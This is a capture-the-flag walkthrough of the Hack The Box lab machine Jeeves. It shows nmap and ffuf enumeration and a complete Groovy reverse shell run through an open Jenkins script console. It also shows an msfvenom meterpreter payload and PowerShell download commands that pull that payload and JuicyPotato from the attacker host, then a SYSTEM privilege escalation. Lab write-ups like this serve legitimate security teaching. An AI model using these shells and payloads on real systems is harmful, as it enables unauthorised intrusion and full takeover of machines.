# Jeeves - Hack The Box Walkthrough

**Date**: 2024-12-04  

---

## Scope

**Target IP**: `10.10.10.63`  
**Machine Name**: Jeeves  
**OS**: Windows 10 Pro x86

I stored the target IP in a file and added `jeeves.htb` to my `/etc/hosts` for easier access.  

---

## Enumeration

### 1. Port Scanning
I performed an Nmap scan to identify open ports:
```bash
nmap -p- 10.10.10.63 -v -oN nmap/full_tcp_ports_scan.txt
```

**Open Ports**:
```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```

### 2. Service Enumeration
I performed a detailed scan of these ports:
```bash
nmap -p80,135,445,50000 -A -T4 -v -oN nmap/service_scan.txt
```

**Key Findings**:
- **Port 80**: Microsoft IIS 10.0 serving a basic webpage titled *Ask Jeeves*.
- **Port 50000**: Running Jetty 9.4.z-SNAPSHOT, presenting an HTTP 404 error.  
- **SMB**:
  - Message signing disabled, which could allow an SMB relay attack:
    ```text
    | smb-security-mode: 
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    ```

---

## HTTP on Port 80

I accessed the webpage at `http://jeeves.htb`. It was a simple HTTP page with no actionable content. Running `ffuf` for directory enumeration yielded no useful results.

---

## HTTP on Port 50000 - Jenkins

Accessing `http://jeeves.htb:50000` returned a 404 error. Using `ffuf` for directory enumeration:
```bash
ffuf -c -u "http://jeeves.htb:50000/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

I discovered the directory `/askjeeves`, leading to a Jenkins instance accessible without credentials:
```text
http://jeeves.htb:50000/askjeeves/
```

![image](https://github.com/user-attachments/assets/b02e65da-6048-4132-abe5-cc71bb1e5e63)

---

## Exploitation via Jenkins

Jenkins provides a Groovy script console, which allows remote code execution.  
**Steps**:
1. Navigate to `Manage Jenkins > Script Console`.

![image](https://github.com/user-attachments/assets/507e695a-54f7-47ac-a78c-f708490cba14)

2. Generate a reverse shell payload using [Reverse Shell Generator](https://www.revshells.com/):
    ```groovy
    String host="<your_IP>";
    int port=<your_port>;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);}
    p.destroy();
    s.close();
    ```

![image](https://github.com/user-attachments/assets/6888660c-dfe1-48f5-aecb-62eba7986519)

3. Start a listener:
    ```bash
    nc -lvnp 9001
    ```
4. Run the payload in the Jenkins script console.

![image](https://github.com/user-attachments/assets/767fdb96-40fb-4155-88bd-9a8ffe18a953)

**Outcome**: Obtained a reverse shell as a low-privileged user and retrieved the **user flag**.

---

## Privilege Escalation

### 1. Token Impersonation via JuicyPotato
#### Initial Findings
Checking privileges revealed `SeImpersonatePrivilege` enabled:
```bash
whoami /priv
```

#### Exploitation
1. **Download JuicyPotato** on your local machine:
   ```bash
   wget "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
   ```
2. **Generate a Meterpreter Reverse Shell**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=8887 -f exe -o shell.exe
   ```
3. **Start a Web Server**:
   ```bash
   python3 -m http.server 8081
   ```
4. **Transfer Exploits to the Target**:
   ```bash
   cd %TEMP%
   powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://<your_IP>:8081/JuicyPotato.exe' -OutFile JuicyPotato.exe"
   powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://<your_IP>:8081/shell.exe' -OutFile shell.exe"
   ```
5. **Start Listener**:
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <your_IP>
   set LPORT 8887
   run
   ```
6. **Run JuicyPotato**:
   ```bash
   .\JuicyPotato.exe -t * -p shell.exe -l 443
   ```

**Outcome**: Obtained a Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.

### 2. Alternate Data Stream (ADS)
Inspecting the administrator's desktop, I found no visible `root.txt`. Running the following command revealed a file with an alternate data stream:
```bash
dir /R
```

**Extracting Root Flag**:
```bash
more < hm.txt:root.txt
```

![image](https://github.com/user-attachments/assets/ee7b3388-8040-43b1-ad77-5f56ccfc6885)

---

## Summary

1. Discovered Jenkins on port 50000.
2. Exploited Jenkins Groovy Console to gain initial shell and retrieve user flag.
3. Used JuicyPotato to escalate privileges to `SYSTEM`.
4. Retrieved the root flag from an Alternate Data Stream (ADS).

---

## Resources

- [Jenkins Penetration Testing](https://www.hackingarticles.in/jenkins-penetration-testing/)
- [Abusing Jenkins Groovy Script Console to get Shell](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)
- [Reverse Shell Generator](https://www.revshells.com/)
- [JuicyPotato](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato)
- [Windows Privilege Escalation — Token Impersonation (SeImpersonatePrivilege)](https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070)

--- 
